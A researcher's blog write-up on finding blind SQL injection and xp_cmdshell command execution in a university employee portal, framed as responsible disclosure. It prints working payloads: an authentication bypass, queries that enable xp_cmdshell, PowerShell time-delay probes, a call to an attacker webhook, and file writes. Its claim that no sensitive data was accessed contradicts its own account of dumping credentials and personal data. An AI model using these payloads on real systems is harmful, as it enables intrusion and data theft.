# :link: Discovery of Blind SQL Injection and OS Command Injection Vulnerabilities in a University Portal

---

# Discovery of Blind SQL Injection and OS Command Injection Vulnerabilities in a University Portal

By: Vedant Bhalgama (@ActiveXSploit)

One day during reconnaissance on a university website, I was exploring various endpoints and gathering intel that could potentially lead to vulnerabilities. While conducting subdomain enumeration, I came across two subdomains — one appeared to be quite old, while the other seemed relatively new. Interestingly, both were publicly accessible over the Internet.

After some tinkering with both sites, I identified a straightforward yet classic SQL Injection vulnerability present in each. Additionally, the newer subdomain was found to be vulnerable to blind command injection.

## Get Avyukt Security’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

In this post, I’ll walk you through the overall process I followed to uncover these vulnerabilities. However, to avoid exposing sensitive information about the target, I’ll only be showcasing one of the subdomains with a limited set of screenshots.

## - 0x01: Summary of the Methodology Used to Discover the Vulnerabilities (TL;DR):

- Performed subdomain enumeration and discovered two exposed subdomains.

- Interacted with both, identifying a university appraisal system for employees login portal built on ASPX, hinting at an MSSQL backend.

- Discovered a working blind-SQL Injection on both subdomains, used it to bypass login on one of the subdomains and later dump the database via Ghauri.

- Noticed the MSSQL backend and attempted command execution using `xp_cmdshell`, which was disabled by default but could be enabled due to high privileges.

- Achieved blind command execution by triggering response delays through `ping `and custom `PowerShell `queries, confirming successful RCE without direct output.

- Tested whether outbound access was allowed by setting up a webhook and attempting to send a request to it. Unfortunately, the server had outbound access disabled.

## - 0x02: Discovering Additional Subdomains via Enumeration :

- For the purpose of this post, we’ll refer to the target website as target.com to avoid disclosing any information related to the actual organization.

- As usual, I started with subdomain enumeration to discover additional subdomains associated with target.com and identify any that seemed interesting or worth exploring further.

I used various tools and techniques to discover subdomains, which are :

- Google Dorks (for eg. site:*.target.com -www)

- [crt.sh](https://crt.sh/)

- [SubFinder](https://github.com/projectdiscovery/subfinder)

- OWASP Amass

- While reviewing the newly discovered subdomains, I came across several, but two stood out — one was a subdomain hosting an application which seemed old enough (from 2019–20) and had been left exposed to the internet, and the other was a relatively recent one (from 2023–24), hosting a an appraisal system for university employees.

The two subdomains that were identified were as follows:

- apps.target.com

- `targetname`web.target.com (Where `targetname` is the actual name of the target organization)

## - 0x03: Discovering a Blind-SQLi Vulnerability on the Login Portal:

- I began exploring the relatively newer application from 2023–24, hosted on apps.target.com. It appeared to be an appraisal system used by university employees.

- I also noticed that the site was pretty basic and built using ASPX, suggesting that it was running on an IIS web server with a likely MSSQL backend.

- After reaching the login portal, the next logical step was to test for SQL Injection by injecting quotes into the input fields. If the application was vulnerable, it would either throw a SQL syntax error or exhibit noticeable changes in its behavior.

- And to my surprise, the application did in fact display a SQL syntax error on the screen — sweet! This confirmed that the application was vulnerable to SQL Injection, and I could proceed to attempt dumping the database.

- However, before attempting to dump the database, I tested a classic SQL Injection-based authentication bypass payload — and it worked. I successfully bypassed the login page and gained access to sensitive appraisal-related information of an employee, along with much more.

```
' or 1=1- -
```

- Next, I attempted to manually extract information from the login page by executing various MSSQL injection queries. Since the application was returning SQL syntax errors, I expected it might also return query results. However, that wasn’t the case — every time I executed a valid query, the application simply responded with an “Invalid login” message. Interestingly, if I intentionally introduced an error in the query, the application did display a SQL syntax error. This indicated that the application was vulnerable to a semi-blind SQL Injection, where SQL errors are reflected but actual query results are not.

- Next, I used Ghauri — a tool similar to SQLMap — to automate the SQL Injection exploitation process and dump the database of the target.com site. It streamlined the process and made extracting data significantly easier.

## - 0x04: Blind Command Execution via xp_cmdshell:

- Even after successfully retrieving the database information from the target site, I wasn’t quite done. Considering the backend was running on MSSQL, I thought — “Why not try executing `xp_cmdshell` and see if remote code execution on the server is possible?”.

- However, since the application didn’t display any query output, I suspected that even if `xp_cmdshell` execution was successful, I wouldn’t see the output of the executed commands — a suspicion that was later confirmed. As a result, I needed to find an alternative way to verify that the command execution actually worked.

- Moving forward, I executed a query to check whether `xp_cmdshell` was enabled on the server. While it’s disabled by default in most cases, there’s always a chance it might be enabled due to a misconfiguration :

```
' EXEC xp_cmdshell 'whoami'; - -
```

- The server immediately returned an SQL error indicating that access to the stored procedure `sys.xp_cmdshell` was blocked — confirming that `xp_cmdshell` was disabled. Interestingly, this was a good sign: if we could manage to enable it, it would likely allow our commands to execute.

- The next logical step was to check whether the database account being used on the backend had sufficient privileges to reconfigure `xp_cmdshell`. To verify this, I executed the following query.

```
'EXEC('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

- Upon executing the query, the server responded with the usual “Invalid Login” message and no visible output — consistent with the previous behavior. This suggested that `xp_cmdshell` was likely enabled. To confirm, I re-ran the earlier `xp_cmdshell` command and checked for any SQL-related errors in the response.

- When I executed the same `whoami` command via MSSQL, there were no errors this time — a good sign. However, as expected, there was still no visible output, only the usual "Invalid Login" response. At this point, I decided to use a different payload to confirm whether command execution was actually taking place:

```
EXEC xp_cmdshell 'ping 127.0.0.1 -n 5
```

- The query above executes a `ping` to localhost, sending only 5 ICMP packets. If the command runs successfully on the server, it would introduce a noticeable delay of around 5 seconds in the response — confirming command execution.

- Upon doing so, I noticed that the server indeed delayed response by around 5 seconds, confirming that command execution worked!

## 0x05: Efforts to Establish a Reverse Shell Connection:

- Next, I wanted to check if outbound access was permitted and whether it was possible to get a reverse shell on the server. To do this, I set up a webhook on my end and executed a query designed to send a request to it. If the request reached my webhook, it would confirm that outbound connections from the server were allowed.

```
' EXEC xp_cmdshell 'powershell -nop -ep bypass -w 1 -c "iwr https://<webhook_url>"'
```

- Unfortunately, I didn’t receive any requests on the webhook. I tried multiple times using different ports and commands, but had no success — indicating that outbound connections from the server were likely restricted.

- Since outbound connections weren’t possible, I decided to try a different approach — writing to the default IIS webroot directory and seeing if I could access the file via the web. To do this, I executed two queries:

- One to check whether the default IIS webroot path (`C:\inetpub\wwwroot`) existed

- Another using a simple `echo` command to write a file to that path. I then attempted to access the file through the website to verify if the write was successful.

```
' EXEC xp_cmdshell 'powershell -ep bypass -w 1 -nop -c "if (Test-Path C:\\inetpub\\wwwroot){Sleep 5}"'; --
```

- The query above uses `Test-Path` to check for the existence of the default IIS webroot. If the path exists, it triggers a 5-second delay in the web server’s response — confirming its presence.

```
' EXEC xp_cmdshell 'powershell -ep bypass -w 1 -nop -c "echo POC » C:\\inetpub\\wwwroot\\POC.txt"'; --
```

- Upon executing the first query, the server response was delayed by approximately 5 seconds, confirming that the IIS webroot path existed. However, when I executed the second query to write a file to that location and tried accessing it through the website, it returned a 404 error — suggesting that either the file wasn’t written successfully or the actual web application root was located elsewhere.

- To confirm my suspicion about whether the file was actually created, I re-ran the `Test-Path` query — this time targeting the `POC.txt` file. Unlike before, the server responded immediately without any delay, indicating that the file did not exist. This confirmed that the write operation had failed, likely because the database user lacked the necessary permissions to write to the web server’s root directory.

- I tried multiple different paths inside the webroot itself too to see if they existed and I could write to them but they didn’t exist at all :

- C:\inetpub\wwwroot\apps\

- C:\inetpub\wwwroot\apps.<target_name>.\

- C:\inetpub\wwwroot\<target_name>\apps\

- And many more …

In addition to the webroot, I also tested whether I could write to a non-standard path like `C:\Temp`. To check its existence, I executed the same `Test-Path` query targeting `C:\Temp`, and the server responded with a 5-second delay — confirming that the directory existed.

```
' EXEC xp_cmdshell 'powershell -ep bypass -w 1 -nop -c "if (Test-Path C:\\Temp){Sleep 5}"'; --
```

Next, I executed a query to write a file to the `C:\Temp` directory using the `echo` command, followed by another `Test-Path` query to check if the file was successfully created. This time, the server response was delayed by around 5 seconds, indicating that the file had indeed been written. This confirmed that while writing to `C:\Temp` was possible, the earlier attempt to write to the webroot likely failed due to insufficient permissions.

```
' EXEC xp_cmdshell 'powershell -ep bypass -w 1 -nop -c "echo POC » C:\\Temp\\POC.txt"'; --
```

```
' EXEC xp_cmdshell 'powershell -ep bypass -w 1 -nop -c "if (Test-Path C:\\Temp\\POC.txt){Sleep 5}"'; --
```

- After spending hours attempting various methods to write to the webroot, I was ultimately unsuccessful. At that point, I decided to responsibly disclose the vulnerabilities to the university officials. I had already confirmed command execution and a SQL Injection vulnerability, which had allowed me to dump their database — exposing sensitive information related to both students and employees, including credentials and personal data.

- This assessment highlights how even a seemingly forgotten or outdated endpoint can introduce critical security risks. In this case, a simple blind SQL injection led to full database compromise and remote command execution on the server. To prevent such incidents, organizations should regularly audit their infrastructure, decommission unused applications, enforce strict input validation, and apply the principle of least privilege to database accounts.

All vulnerabilities described in this post were discovered during a controlled security assessment for educational and awareness purposes. The issues were reported to the concerned university through the appropriate channels to ensure they could be remediated. No sensitive data was accessed, and no disruption of services was caused during testing.

Thanks for reading Avyukt Security! Subscribe for free to receive new content.

Happy Hacking!

---
